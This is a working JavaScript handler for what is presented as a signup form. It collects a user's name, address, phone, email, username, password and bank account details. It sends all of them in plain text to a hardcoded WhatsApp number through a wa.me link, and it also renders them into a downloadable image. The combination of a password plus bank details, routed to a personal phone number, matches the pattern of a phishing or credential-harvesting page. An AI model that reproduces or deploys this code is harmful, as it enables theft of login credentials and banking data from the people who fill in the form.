// Function to handle form submission
document.getElementById('signupForm').addEventListener('submit', function (e) {
    e.preventDefault(); // Prevent form from submitting the default way

    // Get the values from the form fields
    const name = document.getElementById('name').value;
    const address = document.getElementById('address').value;
    const phone = document.getElementById('phone').value;
    const email = document.getElementById('email').value;
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const bankName = document.getElementById('bankName').value;
    const accountNumber = document.getElementById('accountNumber').value;
    const accountName = document.getElementById('accountName').value;
    const branch = document.getElementById('branch').value;

    // Prepare the message text for WhatsApp
    const message = `Signup Details:\n\nName: ${name}\nAddress: ${address}\nPhone Number: ${phone}\nEmail: ${email}\nUsername: ${username}\nPassword: ${password}\n\nBank Details:\nBank Name: ${bankName}\nAccount Number: ${accountNumber}\nAccount Name: ${accountName}\nBranch: ${branch}`;

    // Send to WhatsApp using WhatsApp API link (may need a business API for automation)
    const whatsappNumber = "94788054702"; // Replace with your WhatsApp number
    const whatsappLink = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
    window.open(whatsappLink, '_blank'); // Opens WhatsApp link in a new tab

    // Create and download the image with signup details
    createDownloadableImage(message);
});

// Function to create a downloadable image from the text
function createDownloadableImage(text) {
    // Set up the canvas for image generation
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    canvas.width = 800; // Set width
    canvas.height = 400; // Set height

    // Set background and text style
    context.fillStyle = 'white'; // Background color
    context.fillRect(0, 0, canvas.width, canvas.height);
    context.font = '20px Arial';
    context.fillStyle = 'black'; // Text color

    // Split text into lines and draw them
    const lines = text.split('\n');
    let yPosition = 40;
    lines.forEach((line) => {
        context.fillText(line, 20, yPosition);
        yPosition += 30;
    });

    // Create download link with styling
    const imageUrl = canvas.toDataURL('image/png');
    const downloadLink = document.createElement('a');
    downloadLink.href = imageUrl;
    downloadLink.download = 'Signup_Details.png';
    downloadLink.textContent = 'Download Signup Details';

    // Apply styles to make the button yellow and visually appealing
    downloadLink.style.display = 'inline-block';
    downloadLink.style.padding = '10px 20px';
    downloadLink.style.marginTop = '20px';
    downloadLink.style.backgroundColor = '#FFD700'; // Yellow color
    downloadLink.style.color = '#333'; // Dark text for contrast
    downloadLink.style.borderRadius = '5px'; // Rounded corners
    downloadLink.style.textDecoration = 'none'; // Remove underline
    downloadLink.style.fontWeight = 'bold';
    downloadLink.style.boxShadow = '0px 4px 8px rgba(0, 0, 0, 0.2)'; // Subtle shadow

    document.body.appendChild(downloadLink);
}
